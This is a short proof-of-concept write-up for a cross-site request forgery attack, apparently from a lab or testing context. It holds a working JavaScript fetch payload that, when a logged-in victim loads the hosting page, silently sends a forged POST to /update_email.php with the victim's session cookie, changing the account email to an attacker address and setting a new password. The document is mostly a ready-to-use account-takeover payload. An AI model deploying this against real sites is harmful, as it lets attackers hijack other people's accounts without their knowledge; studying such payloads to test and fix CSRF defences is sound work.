# CSRF EMAIL CHANGE

This is a CSRF (Cross-Site Request Forgery) proof-of-concept. When a logged-in victim visits a page hosting this script, their browser automatically attaches their session cookie (via `credentials: 'include'`) to a forged `POST` request, silently changing the account's recovery email and password if the target app doesn't validate request origin or require a CSRF token.

---

Sends `email=pwnedadmin@evil.local&password=pwnedadmin` to `/update_email.php` using the victim's own session, with no user interaction required beyond loading the page.

---
### Script:
```javascript
fetch('/update_email.php', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type':'application/x-www-form-urlencoded'},
  body: 'email=pwnedadmin@evil.local&password=pwnedadmin'
});
```
